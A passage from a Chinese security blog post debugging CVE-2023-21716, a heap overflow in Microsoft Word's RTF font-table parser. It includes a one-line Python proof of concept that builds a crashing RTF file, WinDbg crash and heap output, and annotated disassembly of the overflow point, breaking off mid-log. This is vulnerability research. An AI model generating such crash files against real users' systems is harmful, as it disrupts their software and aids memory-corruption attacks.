<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>CVE-2023-21716 RTF堆溢出漏洞分析 - B1TG</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="" /><meta name="description" content="前言 @jduck 近日公开了CVE-2023-21716的POC，并提供了漏洞细节 。
这篇文章主要是记录下我调试这个漏洞POC的过程。
POC样本 生成POC的只需要很短的代码：
" /><meta name="keywords" content="Hugo, b1tg, even" />






<meta name="generator" content="Hugo 0.140.2 with theme even" />


<link rel="canonical" href="https://b1tg.github.io/post/cve-2023-21716-office-rtf-vuln/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:url" content="https://b1tg.github.io/post/cve-2023-21716-office-rtf-vuln/">
  <meta property="og:site_name" content="B1TG">
  <meta property="og:title" content="CVE-2023-21716 RTF堆溢出漏洞分析">
  <meta property="og:description" content="前言 @jduck 近日公开了CVE-2023-21716的POC，并提供了漏洞细节 。
这篇文章主要是记录下我调试这个漏洞POC的过程。
POC样本 生成POC的只需要很短的代码：">
  <meta property="og:locale" content="zh_cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2023-03-08T22:12:00+08:00">
    <meta property="article:modified_time" content="2023-03-08T22:12:00+08:00">
    <meta property="article:tag" content="漏洞分析">

  <meta itemprop="name" content="CVE-2023-21716 RTF堆溢出漏洞分析">
  <meta itemprop="description" content="前言 @jduck 近日公开了CVE-2023-21716的POC，并提供了漏洞细节 。
这篇文章主要是记录下我调试这个漏洞POC的过程。
POC样本 生成POC的只需要很短的代码：">
  <meta itemprop="datePublished" content="2023-03-08T22:12:00+08:00">
  <meta itemprop="dateModified" content="2023-03-08T22:12:00+08:00">
  <meta itemprop="wordCount" content="1346">
  <meta itemprop="keywords" content="漏洞分析">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2023-21716 RTF堆溢出漏洞分析">
  <meta name="twitter:description" content="前言 @jduck 近日公开了CVE-2023-21716的POC，并提供了漏洞细节 。
这篇文章主要是记录下我调试这个漏洞POC的过程。
POC样本 生成POC的只需要很短的代码：">

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">B1TG</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/til">
        <li class="mobile-menu-item">TIL</li>
      </a><a href="/about">
        <li class="mobile-menu-item">About</li>
      </a><a href="/quotes">
        <li class="mobile-menu-item">Quotes</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">B1TG</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/til">TIL</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about">About</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/quotes">Quotes</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">CVE-2023-21716 RTF堆溢出漏洞分析</h1>

      <div class="post-meta">
        <span class="post-time"> 2023-03-08 </span>
        
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content always-active">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#前言">前言</a></li>
    <li><a href="#poc样本">POC样本</a></li>
    <li><a href="#漏洞分析">漏洞分析</a></li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <h2 id="前言">前言</h2>
<p><a href="https://twitter.com/jduck">@jduck</a> 近日公开了CVE-2023-21716的POC，并提供了<a href="https://qoop.org/publications/cve-2023-21716-rtf-fonttbl.md">漏洞细节</a> 。</p>
<p>这篇文章主要是记录下我调试这个漏洞POC的过程。</p>
<h2 id="poc样本">POC样本</h2>
<p>生成POC的只需要很短的代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;t3zt.rtf&#34;</span><span class="p">,</span><span class="s2">&#34;wb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">((</span><span class="s2">&#34;{</span><span class="se">\\</span><span class="s2">rtf1{</span><span class="se">\n</span><span class="s2">{</span><span class="se">\\</span><span class="s2">fonttbl&#34;</span> <span class="o">+</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="p">(</span><span class="s2">&#34;{</span><span class="se">\\</span><span class="s2">f</span><span class="si">%d</span><span class="s2">A;}</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">32761</span><span class="p">)</span> <span class="p">])</span> <span class="o">+</span> <span class="s2">&#34;}</span><span class="se">\n</span><span class="s2">{</span><span class="se">\\</span><span class="s2">rtlch no crash??}</span><span class="se">\n</span><span class="s2">}}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>打开样本内容，看上去是这样的：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">rtf1</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">fonttbl</span><span class="p">{</span>\<span class="n">f0A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f1A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f2A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f3A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f4A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f5A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f6A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">...</span><span class="p">]</span> <span class="n">省略很多行</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f32753A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f32754A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f32755A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f32756A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f32757A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f32758A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f32759A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">f32760A</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>\<span class="n">rtlch</span> <span class="n">no</span> <span class="n">crash</span><span class="err">??</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>简单回顾下RTF文件格式的知识：</p>
<ul>
<li><code>\rtf1</code>， <code>\fonttbl</code> 这样的语句叫控制字 (control word)，以反斜杠开始后面加上多个字母作为控制字名，字母后面还可能接可选的数字作为控制字参数</li>
<li>以反斜杠开始后面接单个非字母字符的表示控制符号 (control symbol)，比如 <code>\~</code></li>
<li><code>{}</code> 包含控制字、控制符号、文本等形成组（group）</li>
</ul>
<p>样本中对应控制字的意思：</p>
<table>
  <thead>
      <tr>
          <th>\fN</th>
          <th>字体表中的编号</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>\rtfN</td>
          <td>N表示RTF大版本</td>
      </tr>
      <tr>
          <td>\fonttbl</td>
          <td>字体表</td>
      </tr>
  </tbody>
</table>
<h2 id="漏洞分析">漏洞分析</h2>
<p>测试环境：</p>
<ul>
<li>Microsoft Office 2016 16.0.4266.1003 32位</li>
<li>wwlib.dll 16.0.4266.1003</li>
</ul>
<p>开启页堆</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gflags.exe /p /enable winword.exe /full
</span></span></code></pre></td></tr></table>
</div>
</div><p>根据喜好attach调试，或者直接在windbg里面运行程序：</p>
<p><img src="/img/CVE-2023-21716-rtf-heap/run-in-windbg.png" alt="run-in-windbg"></p>
<p>crash现场：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">(7</span><span class="nf">ac.1a80</span><span class="p">):</span> <span class="nv">Access</span> <span class="nv">violation</span> <span class="o">-</span> <span class="nv">code</span> <span class="nv">c0000005</span> <span class="p">(</span><span class="nv">first</span> <span class="nb">ch</span><span class="nv">ance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">First</span> <span class="nb">ch</span><span class="nv">ance</span> <span class="nv">exceptions</span> <span class="nv">are</span> <span class="nv">reported</span> <span class="nv">before</span> <span class="nv">any</span> <span class="nv">exception</span> <span class="nv">handling.</span>
</span></span><span class="line"><span class="cl"><span class="nf">This</span> <span class="nv">exception</span> <span class="nv">may</span> <span class="nv">be</span> <span class="nv">expected</span> <span class="nv">and</span> <span class="nv">handled.</span>
</span></span><span class="line"><span class="cl"><span class="nf">eax</span><span class="err">=</span><span class="mi">006</span><span class="nv">f2734</span> <span class="nb">ebx</span><span class="err">=</span><span class="mi">00000001</span> <span class="nb">ecx</span><span class="err">=</span><span class="mi">000004</span><span class="nv">e4</span> <span class="nb">edx</span><span class="err">=</span><span class="nv">ffff7ffc</span> <span class="nb">esi</span><span class="err">=</span><span class="mi">54</span><span class="nv">b75ff0</span> <span class="nb">edi</span><span class="err">=</span><span class="mi">00008002</span>
</span></span><span class="line"><span class="cl"><span class="nf">eip</span><span class="err">=</span><span class="mi">0</span><span class="nv">fe700d5</span> <span class="nb">esp</span><span class="err">=</span><span class="mi">006</span><span class="nv">f268c</span> <span class="nb">ebp</span><span class="err">=</span><span class="mi">006</span><span class="nv">f2698</span> <span class="nv">iopl</span><span class="err">=</span><span class="mi">0</span>         <span class="nv">nv</span> <span class="nv">up</span> <span class="nv">ei</span> <span class="nv">pl</span> <span class="nv">nz</span> <span class="nv">na</span> <span class="nv">po</span> <span class="nv">nc</span>
</span></span><span class="line"><span class="cl"><span class="nf">cs</span><span class="err">=</span><span class="mi">0023</span>  <span class="nb">ss</span><span class="err">=</span><span class="mi">002</span><span class="nv">b</span>  <span class="nb">ds</span><span class="err">=</span><span class="mi">002</span><span class="nv">b</span>  <span class="nb">es</span><span class="err">=</span><span class="mi">002</span><span class="nv">b</span>  <span class="nb">fs</span><span class="err">=</span><span class="mi">0053</span>  <span class="nb">gs</span><span class="err">=</span><span class="mi">002</span><span class="nv">b</span>             <span class="nv">efl</span><span class="err">=</span><span class="mi">00210202</span>
</span></span><span class="line"><span class="cl"><span class="nf">wwlib</span><span class="err">!</span><span class="nv">PTLS7</span><span class="p">::</span><span class="nb">Fs</span><span class="nv">UpdateFinitePage</span><span class="o">+</span><span class="mh">0x7635a</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">fe700d5</span> <span class="mi">66894</span><span class="nv">c5604</span>      <span class="nv">mov</span>     <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span><span class="nb">cx</span> <span class="nb">ds</span><span class="p">:</span><span class="mi">002</span><span class="nv">b</span><span class="p">:</span><span class="mi">54</span><span class="nv">b65fec</span><span class="err">=</span><span class="nv">????</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>崩溃原因是写到了已经释放的堆块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0:000&gt;</span> <span class="err">!</span><span class="nf">heap</span> <span class="o">-</span><span class="nv">p</span> <span class="o">-</span><span class="nv">a</span> <span class="mi">54</span><span class="nv">b65fec</span>
</span></span><span class="line"><span class="cl">    <span class="nf">address</span> <span class="mi">54</span><span class="nv">b65fec</span> <span class="nv">found</span> <span class="nv">in</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DPH_HEAP_ROOT</span> <span class="err">@</span> <span class="mi">5</span><span class="nv">af1000</span>
</span></span><span class="line"><span class="cl">    <span class="nf">in</span> <span class="nv">free</span><span class="o">-</span><span class="nv">ed</span> <span class="nb">al</span><span class="nv">location</span> <span class="p">(</span>  <span class="nv">DPH_HEAP_BLOCK</span><span class="p">:</span>         <span class="nv">VirtAddr</span>         <span class="nv">VirtSize</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                   <span class="err">54973</span><span class="nl">b60:</span>         <span class="err">54</span><span class="nf">b65000</span>             <span class="mi">2000</span>
</span></span><span class="line"><span class="cl">    <span class="err">72</span><span class="nf">a3ad92</span> <span class="nv">verifier</span><span class="err">!</span><span class="nv">AVrfDebugPageHeapFree</span><span class="o">+</span><span class="mh">0x000000c2</span>
</span></span><span class="line"><span class="cl">    <span class="err">7708</span><span class="nf">b5e9</span> <span class="nv">ntdll</span><span class="err">!</span><span class="nv">RtlDebugFreeHeap</span><span class="o">+</span><span class="mh">0x0000003e</span>
</span></span><span class="line"><span class="cl">    <span class="err">77033422</span> <span class="nf">ntdll</span><span class="err">!</span><span class="nv">RtlpFreeHeap</span><span class="o">+</span><span class="mh">0x0004dfc2</span>
</span></span><span class="line"><span class="cl">    <span class="err">76</span><span class="nf">fe50c1</span> <span class="nv">ntdll</span><span class="err">!</span><span class="nv">RtlFreeHeap</span><span class="o">+</span><span class="mh">0x00000201</span>
</span></span><span class="line"><span class="cl">    <span class="err">763785</span><span class="nf">d5</span> <span class="nv">msvcrt</span><span class="err">!</span><span class="nv">free</span><span class="o">+</span><span class="mh">0x00000065</span>
</span></span><span class="line"><span class="cl">    <span class="err">6</span><span class="nf">b967549</span> <span class="nv">DWrite</span><span class="err">!</span><span class="nv">ComObject</span><span class="o">&lt;</span><span class="nv">DWriteTextLayout</span><span class="p">,</span><span class="nv">DeleteOnZeroReference</span><span class="o">&gt;</span><span class="p">::</span><span class="nv">Release</span><span class="o">+</span><span class="mh">0x000000d9</span>
</span></span><span class="line"><span class="cl">    <span class="err">6</span><span class="nf">e203576</span> <span class="nv">mso40uiwin32client</span><span class="err">!</span><span class="nv">Ordinal432</span><span class="o">+</span><span class="mh">0x00000098</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">...</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">0:000&gt;</span> <span class="err">!</span><span class="nf">heap</span> <span class="o">-</span><span class="nv">p</span> <span class="o">-</span><span class="nv">a</span> <span class="nb">esi</span>
</span></span><span class="line"><span class="cl">    <span class="nf">address</span> <span class="mi">54</span><span class="nv">b75ff0</span> <span class="nv">found</span> <span class="nv">in</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DPH_HEAP_ROOT</span> <span class="err">@</span> <span class="mi">2</span><span class="nv">f81000</span>
</span></span><span class="line"><span class="cl">    <span class="nf">in</span> <span class="nv">busy</span> <span class="nb">al</span><span class="nv">location</span> <span class="p">(</span>  <span class="nv">DPH_HEAP_BLOCK</span><span class="p">:</span>         <span class="nv">UserAddr</span>         <span class="nv">UserSize</span> <span class="o">-</span>         <span class="nv">VirtAddr</span>         <span class="nv">VirtSize</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                <span class="err">54</span><span class="nl">c708bc:</span>         <span class="err">54</span><span class="nf">b75ff0</span>            <span class="mi">30010</span> <span class="o">-</span>         <span class="mi">54</span><span class="nv">b75000</span>            <span class="mi">32000</span>
</span></span><span class="line"><span class="cl">    <span class="err">72</span><span class="nf">a3ab40</span> <span class="nv">verifier</span><span class="err">!</span><span class="nv">AVrfDebugPageHeapAllocate</span><span class="o">+</span><span class="mh">0x00000240</span>
</span></span><span class="line"><span class="cl">    <span class="err">72</span><span class="nf">a3b004</span> <span class="nv">verifier</span><span class="err">!</span><span class="nv">AVrfDebugPageHeapReAllocate</span><span class="o">+</span><span class="mh">0x00000214</span>
</span></span><span class="line"><span class="cl">    <span class="err">7708</span><span class="nf">bac9</span> <span class="nv">ntdll</span><span class="err">!</span><span class="nv">RtlDebugReAllocateHeap</span><span class="o">+</span><span class="mh">0x0000003c</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>关键位置代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00A8</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">eax</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">cx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00AD</span>                 <span class="nv">movsx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00B1</span>                 <span class="nv">movsx</span>   <span class="nb">ecx</span><span class="p">,</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00B4</span>                 <span class="nv">add</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00B6</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">arg_8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00B9</span>                 <span class="nv">mov</span>     <span class="nb">ax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00BC</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">ax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00C1</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">codepage_</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00C4</span>                 <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00C6</span>                 <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc_102F00DA</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00C8</span>                 <span class="nv">movsx</span>   <span class="nb">ecx</span><span class="p">,</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00CB</span>                 <span class="nv">movsx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00CF</span>                 <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>  <span class="c1">; 下面打印ecx和edx日志的地方</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00D2</span>                 <span class="nv">mov</span>     <span class="nb">cx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00D5</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">cx</span> <span class="c1">; 溢出点</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00DA</span>                 <span class="nv">inc</span>     <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00DD</span>                 <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">loc_102F0082</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在 wwlib+0x002f00cf 处打印断点日志：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">sxe</span> <span class="nv">ld</span><span class="p">:</span><span class="nv">wwlib</span>
</span></span><span class="line"><span class="cl"><span class="nf">bu</span> <span class="nv">wwlib</span><span class="o">+</span><span class="mi">002</span><span class="nv">f00cf</span> <span class="s">&#34;.printf \&#34;=== ecx: 0x%x(%d) edx: 0x%x(%d) \\n\&#34;, ecx, ecx, edx, edx;gc&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以观察到规律:</p>
<ul>
<li>ecx每次递增1</li>
<li>当且仅当ecx等于edx时，edx增加10，其余时间不变</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">=== ecx: 0x0(0) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0x1(1) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0x2(2) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0x3(3) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0x4(4) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0x5(5) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0x6(6) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0x7(7) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0x8(8) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0x9(9) edx: 0xa(10)
</span></span><span class="line"><span class="cl">=== ecx: 0xa(10) edx: 0x14(20) // 每隔10次，edx+=10
</span></span><span class="line"><span class="cl">=== ecx: 0xb(11) edx: 0x14(20)
</span></span><span class="line"><span class="cl">[...]
</span></span><span class="line"><span class="cl">=== ecx: 0xd0b(3339) edx: 0xd0c(3340)
</span></span><span class="line"><span class="cl">=== ecx: 0xd0c(3340) edx: 0xd16(3350) // 每隔10次，edx+=10
